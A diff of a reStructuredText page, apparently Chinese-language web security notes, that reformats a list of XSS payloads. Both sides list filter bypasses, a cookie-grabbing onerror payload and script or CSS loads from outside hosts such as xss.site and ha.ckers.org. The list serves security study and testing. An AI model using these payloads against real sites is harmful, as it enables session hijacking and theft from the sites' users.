@@ -51,51 +51,35 @@ Bypass
 payload
 --------------------------------
 
-常用
-::
+- 常用
+    ``<script>alert(/xss/)</script>``
+- 伪协议
+    ``<table background="javascript:alert(/xss/)"></table>``
+- Chrome XSS auditor bypass with HPP
+    ``?param=https://&param=@z.exeye.io/import%20rel=import%3E``
 
-    <script>alert(/xss/)</script>
+- 长度限制
 
-伪协议
-::
-
-    <table background="javascript:alert(/xss/)"></table>
-
-Chrome XSS auditor bypass with HPP:
-::
-
-    ?param=https://&param=@z.exeye.io/import%20rel=import%3E
-
-长度限制
-::
+:: 
 
     <script>s+="l"</script>
     \...
     <script>eval(s)</script>
 
-jquery sourceMappingURL
-::
+- jquery sourceMappingURL
+    ``</textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>``
+- 图片名
+    ``"><img src=x onerror=alert(document.cookie)>.gif``
 
-    </textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>
+- 过期的payload
+    - src=javascript:alert基本不可以用
+    - css expression特性只在旧版本ie可用
+- css
+    ``<div style="background-image:url(javascript:alert(/xss/))">
+    <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>``
 
-图片名
-::
+- iframe
 
-    "><img src=x onerror=alert(document.cookie)>.gif
-
-过期的payload
-::
-    
-    src=javascript:alert 基本不可以用
-    css expression特性只在旧版本ie可用
-
-css
-::
-
-    <div style="background-image:url(javascript:alert(/xss/))">
-    <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
-
-iframe
 ::
 
     <iframe onload='
@@ -106,7 +90,5 @@ iframe
         '
     />
 
-meta
-::
-
-    <META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+- meta
+    ``<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">``
